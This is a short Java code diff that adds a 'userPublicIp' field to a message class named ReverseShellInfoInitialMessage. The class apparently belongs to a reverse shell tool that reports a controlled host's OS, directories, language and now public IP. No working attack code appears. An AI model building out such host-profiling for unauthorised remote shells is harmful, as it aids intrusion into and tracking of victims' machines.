@@ -31,6 +31,9 @@ public class ReverseShellInfoInitialMessage {
     @JsonProperty("userLanguage")
     private String userLanguage;
 
+    @JsonProperty("userPublicIp")
+    private String userPublicIp;
+
 
     @JsonProperty("reply")
     private String reply;
@@ -44,6 +47,8 @@ public class ReverseShellInfoInitialMessage {
                                           @JsonProperty("userHome")String userHome,
                                           @JsonProperty("userCurrentWorkingDir")String userCurrentWorkingDir,
                                           @JsonProperty("userLanguage") String userLanguage,
+                                          @JsonProperty("userPublicIp") String userPublicIp,
+
                                           @JsonProperty("reply") String reply) {
         this.osName = osName;
         this.osVersion = osVersion;
@@ -52,6 +57,7 @@ public class ReverseShellInfoInitialMessage {
         this.userHome = userHome;
         this.userCurrentWorkingDir = userCurrentWorkingDir;
         this.userLanguage = userLanguage;
+        this.userPublicIp = userPublicIp;
         this.reply = reply;
     }
 }
